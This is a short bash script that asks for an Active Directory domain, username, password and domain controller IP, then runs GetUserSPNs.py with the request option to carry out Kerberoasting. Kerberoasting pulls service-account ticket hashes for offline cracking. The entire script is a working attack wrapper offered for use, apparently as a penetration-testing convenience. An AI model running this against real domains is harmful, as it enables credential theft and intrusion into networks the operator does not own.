#!/bin/bash 

# This command asks for variables and then kerberoasts with the proper syntax 
# GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP of DC> -request

echo "Domain: "
read domain

echo "Username: "
read username 

echo "Password: "
read password

echo "IP Address: "
read ip_address 

GetUserSPNs.py $domain/$username:$password -dc-ip $ip_address -request
